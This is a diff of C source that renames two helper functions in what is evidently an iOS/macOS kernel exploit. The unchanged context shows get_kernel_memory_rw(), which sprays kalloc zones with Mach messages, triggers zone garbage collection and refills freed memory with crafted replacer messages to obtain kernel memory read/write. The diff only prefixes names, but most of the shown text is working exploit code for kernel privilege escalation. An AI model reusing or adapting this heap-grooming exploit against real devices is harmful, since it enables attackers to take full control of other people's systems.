@@ -192,7 +192,7 @@ struct simple_msg  {
   char buf[0];
 };
 
-mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replacer_body_size) {
+mach_port_t asy_send_kalloc_message(uint8_t* replacer_message_body, uint32_t replacer_body_size) {
   // allocate a port to send the messages to
   mach_port_t q = MACH_PORT_NULL;
   kern_return_t err;
@@ -260,7 +260,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
  
  When the message is actually written into this buffer it's aligned to the end
  */
-int message_size_for_kalloc_size(int kalloc_size) {
+int asy_message_size_for_kalloc_size(int kalloc_size) {
   return ((3*kalloc_size)/4) - 0x74;
 }
 
@@ -482,10 +482,10 @@ mach_port_t get_kernel_memory_rw() {
   kern_return_t err;
   
   uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;
-  uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);
+  uint32_t replacer_body_size = asy_message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);
   uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
   
-  printf("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
+  printf("message size for kalloc.4096: %d\n", asy_message_size_for_kalloc_size(4096));
   
   prepare_user_client();
   
@@ -501,7 +501,7 @@ mach_port_t get_kernel_memory_rw() {
   mach_port_t* pre_ports = prepare_ports(n_pre_ports);
   
   // make a bunch of smaller allocations in a different zone which can be collected later:
-  uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);
+  uint32_t smaller_body_size = asy_message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);
   
   uint8_t* smaller_body = malloc(smaller_body_size);
   memset(smaller_body, 'C', smaller_body_size);
@@ -509,7 +509,7 @@ mach_port_t get_kernel_memory_rw() {
   const int n_smaller_ports = 600; // 150 MB
   mach_port_t smaller_ports[n_smaller_ports];
   for (int i = 0; i < n_smaller_ports; i++) {
-    smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
+    smaller_ports[i] = asy_send_kalloc_message(smaller_body, smaller_body_size);
   }
   
   // now find a suitable port
@@ -570,7 +570,7 @@ mach_port_t get_kernel_memory_rw() {
   for (i = 0; i < replacer_ports_limit; i++) {
     uint64_t context_val = (context_magic)|i;
     *context_ptr = context_val;
-    replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
+    replacer_ports[i] = asy_send_kalloc_message(replacer_message_body, replacer_body_size);
     
     // we want the GC to actually finish, so go slow...
     pthread_yield_np();
@@ -618,7 +618,7 @@ mach_port_t get_kernel_memory_rw() {
   
   for (int i = 0; i < n_second_replacer_ports; i++) {
     *context_ptr = i;
-    second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
+    second_replacer_ports[i] = asy_send_kalloc_message(replacer_message_body, replacer_body_size);
   }
   
   // hopefully that worked the second time too!
